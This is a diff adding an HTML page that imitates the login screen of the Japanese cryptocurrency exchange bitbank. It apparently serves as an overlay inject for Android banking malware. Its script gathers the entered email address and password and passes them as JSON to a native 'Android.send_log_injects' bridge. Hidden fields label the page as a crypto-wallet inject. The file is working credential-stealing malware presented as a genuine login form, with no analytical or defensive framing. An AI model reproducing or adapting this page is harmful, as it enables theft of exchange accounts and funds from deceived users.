@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>ビットコイン・仮想通貨取引所</title>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background-color: #ffffff;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+
+#bitbank {
+    display: table;
+    position: absolute;
+    height: 100%;
+    width: 100%;
+	overflow: hidden;
+}
+#bitbank .logo {
+    text-align: center;
+}
+#bitbank .content {
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    max-width: 440px;
+    width: calc(100% - 88px);
+    padding: 44px 44px 84px 44px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    min-width: 200px;
+    overflow: hidden;
+}
+#bitbank input::placeholder {
+    transition: none;
+    color: rgba(0,0,0,.42);
+}
+#bitbank input {
+    margin-bottom:1.25em;
+    height: 44px;
+    width: 100%;
+    padding: 0 10px;
+    border: none;
+    border-bottom: 1px solid #9da3a6;
+    background: #fff;
+        background-clip: border-box;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #000;
+    font-size: 1em;
+    font-family: Helvetica,Arial,sans-serif;
+    font-size: 14px;
+    font-weight: 400;
+    direction: ltr;
+}
+#bitbank .createtext {
+    margin-bottom: 16px;
+    font-size: .8125rem;
+    color: #262626;
+    text-align: left;
+}
+#bitbank .btnNext {
+    border-radius: 4px;
+    width: 100%;
+    height: 46px;
+    margin-top: 16px;
+    box-shadow: none;
+    display: block;
+    line-height: 46px;
+    background-color: #029688;
+    color: #fff;
+    box-sizing: border-box;
+    position: relative;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    cursor: pointer;
+    outline: 0;
+    border: none;
+    -webkit-tap-highlight-color: transparent;
+    display: inline-block;
+    white-space: nowrap;
+    text-decoration: none;
+    vertical-align: baseline;
+    text-align: center;
+    min-width: 64px;
+    line-height: 36px;
+    padding: 0 16px;
+    border-radius: 4px;
+    overflow: visible;
+    transform: translate3d(0,0,0);
+}
+#bitbank .btnNext:hover {
+    background-color: #005ea6;
+    outline: 0;
+}
+#bitbank .middle {
+    display: table-cell;
+    vertical-align: middle;
+}
+#bitbank .mailText {
+    margin-top: 35px;
+    width: 100%;
+    text-align: center;
+}
+.centerhr hr {
+    border: none;
+    border-top: 1px solid #eee;
+}
+.centerhr .toptextspan {
+    background-color: #fff;
+    color: #999;
+    font-size: 12.6px;
+    padding: 5px;
+    position: relative;
+    top: -18px;
+}
+.centerhr {
+    margin-top: 20px;
+    text-align: center;
+    margin-bottom: 20px;
+}
+.ainfo {
+    text-decoration: none;
+    margin-top: 16px;
+    text-align: center;
+    width: 100%;
+    display: block;
+    color: #029688;
+    font-size: 11.2px;
+}
+</style>
+</head>
+<body>
+    <div id="bitbank">
+        <div class="middle">
+            <div class="content">
+                <div class="logo">
+                    <svg width="160" height="50" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="127.769px" height="31.5px" viewBox="0 0 127.769 31.5" enable-background="new 0 0 127.769 31.5" xml:space="preserve">
+                        <svg version="1.1" id="レイヤー_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 300 88" style="enable-background:new 0 0 300 88;" xml:space="preserve">
+						<style type="text/css">
+							.st0{fill:#003F6B;}
+							.st1{fill:#2EAA8F;}
+						</style>
+						<g>
+							<g>
+								<path class="st0" d="M108.6,30.2v14.4c1.3-1.3,2.7-2.3,4.3-3c1.5-0.7,3.2-1,4.9-1c3.8,0,7,1.4,9.6,4.3c2.6,2.9,4,6.5,4,11    c0,4.3-1.4,7.9-4.1,10.8c-2.7,2.9-6,4.3-9.7,4.3c-1.7,0-3.2-0.3-4.7-0.9c-1.4-0.6-2.9-1.6-4.3-2.9v3.1h-7.2V30.2H108.6z     M116.3,47.4c-2.3,0-4.2,0.8-5.7,2.3c-1.5,1.6-2.3,3.6-2.3,6.1c0,2.6,0.8,4.7,2.3,6.2c1.5,1.6,3.4,2.4,5.7,2.4    c2.2,0,4.1-0.8,5.6-2.4c1.5-1.6,2.3-3.7,2.3-6.2c0-2.5-0.7-4.5-2.2-6.1C120.4,48.2,118.5,47.4,116.3,47.4z"/>
+								<path class="st0" d="M140.2,29.5c1.3,0,2.4,0.5,3.3,1.4c0.9,0.9,1.4,2,1.4,3.4c0,1.3-0.4,2.4-1.4,3.3c-0.9,0.9-2,1.4-3.2,1.4    c-1.3,0-2.4-0.5-3.3-1.4c-0.9-0.9-1.4-2.1-1.4-3.4c0-1.3,0.5-2.4,1.4-3.3C137.8,30,138.9,29.5,140.2,29.5z M136.6,41.4h7.3v28.9    h-7.3V41.4z"/>
+								<path class="st0" d="M151.3,30.8h7.3v10.7h4.3v6.3h-4.3v22.7h-7.3V47.7h-3.7v-6.3h3.7V30.8z"/>
+								<path class="st0" d="M174,30.2v14.4c1.3-1.3,2.7-2.3,4.3-3c1.5-0.7,3.2-1,4.9-1c3.8,0,7,1.4,9.6,4.3c2.6,2.9,4,6.5,4,11    c0,4.3-1.4,7.9-4.1,10.8c-2.7,2.9-6,4.3-9.7,4.3c-1.7,0-3.2-0.3-4.7-0.9c-1.4-0.6-2.9-1.6-4.3-2.9v3.1h-7.2V30.2H174z M181.6,47.4    c-2.3,0-4.2,0.8-5.7,2.3c-1.5,1.6-2.3,3.6-2.3,6.1c0,2.6,0.8,4.7,2.3,6.2c1.5,1.6,3.4,2.4,5.7,2.4c2.2,0,4.1-0.8,5.6-2.4    c1.5-1.6,2.3-3.7,2.3-6.2c0-2.5-0.7-4.5-2.2-6.1C185.8,48.2,183.9,47.4,181.6,47.4z"/>
+								<path class="st0" d="M224.1,41.4h7.3v28.9h-7.3v-3.1c-1.4,1.3-2.8,2.3-4.3,2.9c-1.4,0.6-3,0.9-4.6,0.9c-3.7,0-7-1.4-9.7-4.3    c-2.7-2.9-4.1-6.5-4.1-10.8c0-4.5,1.3-8.1,4-11c2.6-2.9,5.8-4.3,9.6-4.3c1.7,0,3.4,0.3,4.9,1c1.5,0.7,2.9,1.6,4.2,3V41.4z     M216.5,47.4c-2.2,0-4.1,0.8-5.6,2.4c-1.5,1.6-2.2,3.6-2.2,6.1c0,2.5,0.8,4.6,2.3,6.2c1.5,1.6,3.4,2.4,5.6,2.4    c2.3,0,4.2-0.8,5.7-2.4c1.5-1.6,2.3-3.7,2.3-6.2c0-2.5-0.7-4.6-2.3-6.1C220.7,48.2,218.8,47.4,216.5,47.4z"/>
+								<path class="st0" d="M238.7,41.4h7.3v3c1.6-1.4,3.1-2.4,4.5-2.9c1.3-0.5,2.7-0.8,4.1-0.8c2.9,0,5.3,1,7.3,3    c1.7,1.7,2.5,4.2,2.5,7.6v19.1h-7.2V57.7c0-3.5-0.2-5.8-0.5-6.9c-0.3-1.1-0.9-2-1.6-2.6c-0.8-0.6-1.7-0.9-2.9-0.9    c-1.5,0-2.7,0.5-3.8,1.5c-1.1,1-1.8,2.3-2.2,4.1c-0.2,0.9-0.3,2.9-0.3,5.9v11.6h-7.3V41.4z"/>
+								<path class="st0" d="M271.4,30.2h7.3v23.1l10.7-11.9h9.1L286,55.3l14,15.1h-9L278.7,57v13.3h-7.3V30.2z"/>
+							</g>
+							<g>
+								<path class="st1" d="M37.7,35.1c-8.4,0-15.2,6.8-15.2,15.2c0,8.4,6.8,15.2,15.2,15.2c8.4,0,15.2-6.8,15.2-15.2    C52.8,41.9,46,35.1,37.7,35.1z"/>
+								<path class="st0" d="M37.7,12.6c-5.4,0-10.5,1.1-15.2,3.2v12.9c4.3-3,9.5-4.8,15.2-4.8c14.6,0,26.4,11.9,26.4,26.4    c0,14.6-11.8,26.4-26.4,26.4c-14.6,0-26.4-11.8-26.4-26.4V23.5V0H0v50.3C0,71.1,16.9,88,37.7,88c20.8,0,37.7-16.9,37.7-37.7    C75.3,29.5,58.5,12.6,37.7,12.6z"/>
+							</g>
+						</g>
+						</svg>
+                    </svg>
+                </div>
+                <div class="centerhr">
+                    <hr>
+                    <span class="toptextspan">ログイン</span>
+                </div>
+                <div id="page3">
+                    <input id="bitbanklogin" type="text" name="email" placeholder="メールアドレス">
+                    <input id="bitbankpassword" type="password" name="password" placeholder="パスワード">
+                    <a class="ainfo" href="#">パスワードをお忘れの方はこちら</a>
+                    <a class="ainfo" href="#">アカウントをお持ちではない方はこちら</a>
+                    <input name="type_injects" value='crypt' type="hidden" required>
+                    <input name="closed" value='close_activity_injects' type="hidden" required>
+                    <button class="btnNext" onclick="process('bitbank');">ログイン</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<script>
+
+function Backbitbank() {
+    document.getElementById('page3').style.display = 'block';
+    document.getElementById('page4').style.display = 'none';
+}
+
+
+
+function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSONbyName(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+       alert(formToJSONbyName(document.getElementById(formId)));
+    }
+    formChange(formId);
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+</script>
+</html>
